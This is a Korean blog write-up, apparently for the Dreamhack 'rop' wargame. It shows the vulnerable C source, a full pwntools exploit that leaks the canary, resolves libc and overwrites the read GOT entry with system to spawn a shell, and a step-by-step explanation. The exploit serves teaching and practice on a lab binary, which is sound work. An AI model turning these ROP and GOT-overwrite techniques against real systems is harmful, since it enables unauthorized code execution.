---
title: "[Dreamhack] rop Write up"
author: d0razi
date: 2023-08-19 10:45
categories: [InfoSec, Pwn]
tags: [Write up, Dreamhack]
image: /assets/img/media/banner/dreamhack.jpg
---

## 문제 분석

```c
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

## 익스플로잇 코드

```python
from pwn import *

p = process("./rop")
e = ELF("./rop")
libc = ELF("/home/sung/dreamhack/rop/libc-2.27.so")

nop = 0x000000000040055e
system = 0x601030 - 0xc0ca0
binsh = 0x7ffff7f7f5bd

def slog(name, addr): return success(": ".join([name, hex(addr)]))

#Canary_Part
payload = b'A' * 0x39
p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)
canary = u64(b'\00' + p.recv(7))
slog("Canary",canary)

#read Part
read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']
pop_rdi = 0x00000000004007f3
pop_rsi_r15 = 0x00000000004007f1

payload = b"A"*0x38 + p64(canary) + b"B"*0x8
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)

# read(0, read_got, 0x10)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got+0x8)
payload += p64(read_plt)

#Finish
p.sendafter("Buf: ", payload)
read = u64(p.recvn(6)+b"\x00"*2)
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]
slog("read", read)
slog("libc base", lb)
slog("system", system)
p.send(p64(system)+b"/bin/sh\x00")
p.interactive()
```

이해한 대로 설명을 해보겠습니다.

일단 카나리값을 leak해줍니다. 그리고 lib의 read의 실제 주소를 알기위해 puts(read_got) 코드를 rop로 코딩해줍니다. 그러면 read의 실제 주소가 출력됩니다

```python
payload = b"A"*0x38 + p64(canary) + b"B"*0x8
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)
```

출력된 read의 실제 주소를 입력받는 코드를 작성해줍니다. 그리고 입력받은 실제주소로 lib의 base주소를 구해서 system 함수의 위치도 구해줍니다.

```python
read = u64(p.recvn(6)+b"\x00"*2)
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]
```

그리고 read함수의 got주소에 입력을 받는 코드를 작성해줍니다.

```python
# read(0, read_got, 0x10)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)
```

이 코드로 인해서 read함수가 호출되기때문에 후에 `p.send(p64(system)+b"/bin/sh\x00")` 이렇게 한번더 입력을해서 read함수를 사실상 system함수로 바꿀수가있습니다. 그리고 `/bin/sh`은 read_got에서 부터 8바이트 만큼 뒤에 떨어져있습니다.

그리고 이제 read함수는 system함수로 변했으니까 `/bin/sh` 을 rdi에 넣어주고 read함수를 호출하면 쉘을 딸수가 있습니다.

```python
payload += p64(pop_rdi)
payload += p64(read_got+0x8)
payload += p64(read_plt)
```